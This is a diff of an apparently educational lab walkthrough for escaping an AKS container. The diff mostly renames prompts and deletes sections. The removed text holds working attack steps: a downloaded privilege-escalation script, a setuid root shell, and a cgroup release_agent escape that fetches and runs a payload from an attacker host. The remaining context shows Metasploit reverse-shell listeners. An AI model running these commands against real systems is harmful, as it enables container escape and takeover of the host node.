@@ -296,7 +296,7 @@ root@lunalectric-attacker-vm-ua3k:~#
 Once you have ssh'd on to the host you will find a `/root/container-escape` directory with the following files:
 
 ```bash
-root@attacker:~# cd /root/container-escape/
+root@lunalectric-attacker-vm-ua3k:~# cd /root/container-escape/
 root@attacker:~/container-escape# ls -la
 total 1108
 drwxr-xr-x 2 root root    4096 Aug 15 18:14 .
@@ -313,7 +313,7 @@ drwx------ 5 root root    4096 Aug 15 18:14 ..
 In the first terminal, start `msfconsole` listening on port `4242` for the container:
 
 ```bash
-root@attacker:~# cd /root/container-escape/
+root@lunalectric-attacker-vm-ua3k:~# cd /root/container-escape/
 
 root@attacker:~/container-escape# ./msfconsole1
 [*] Using configured payload generic/shell_reverse_tcp
@@ -323,23 +323,6 @@ lport => 4242
 [*] Started reverse TCP handler on 0.0.0.0:4242
 ```
 
-### Start the host listener
-
-In the second terminal, start `msfconsole` listening on port `4243` for the host:
-
-```bash
-azureuser@attacker:~$ sudo -i
-
-root@attacker:~# cd /root/container-escape/
-
-root@attacker:~/container-escape# ./msfconsole2
-[*] Using configured payload generic/shell_reverse_tcp
-payload => linux/x86/shell/reverse_tcp
-lhost => 0.0.0.0
-lport => 4243
-[*] Started reverse TCP handler on 0.0.0.0:4243
-```
-
 ### Start Ruby webserver
 
 In the third terminal, start webserver with Ruby:
@@ -347,7 +330,7 @@ In the third terminal, start webserver with Ruby:
 ```bash
 azureuser@attacker:~$ sudo -i
 
-root@attacker:~# cd /root/container-escape/
+root@lunalectric-attacker-vm-ua3k:~# cd /root/container-escape/
 
 root@attacker:~/container-escape# ./start_ruby_webserver
 [2022-08-15 18:28:35] INFO  WEBrick 1.4.2
@@ -387,64 +370,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 You have a shell and are the `www-data` user.
 
-### Escalate Privileges on the container
 
-Now you need do the privilege escalation within the container to gain root. In the terminal where the container listener and run the following commands:
-
-```bash
-cd /tmp
-```
-
-Download the `priv-es` script to `/tmp`
-```bash
-curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
-```
-
-Make the script executable:
-```bash
-chmod a+x ./priv-es
-```
-
-Execute the script
-```bash
-./priv-es
-python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-```
-
-Show that you are now root on the container
-
-```bash
-id
-uid=0(root) gid=0(root) groups=0(root),33(www-data)
-```
-
-### Gain access to worker nodes
-
-Now that you are root you can execute the following command to perform the container escape. Before you do this change the `<attacker_vm_public_ip>`
-
-```bash
-mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
-echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
-echo '#!/bin/sh' > /cmd
-echo "curl -vk http://<attacker_vm_public_ip>:8001/met-host -o /tmp/met" >> /cmd
-echo "chmod 777 /tmp/met" >> /cmd
-echo "/tmp/met" >> /cmd
-chmod a+x /cmd
-sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-```
-
-Now you got the reverse shell with root privileges from the kubernetes node, to verify it, show your are root and compare the ip addresses with kubectl
-
-```bash
-[*] Sending stage (36 bytes) to 20.237.90.231
-[*] Command shell session 1 opened (10.0.1.4:4243 -> 20.237.90.231:1024) at 2022-08-15 18:38:39 +0000
-
-id
-uid=0(root) gid=0(root) groups=0(root)
-hostname
-aks-default-41472297-vmss000000
-```
 
 ```bash
 kubectl get nodes
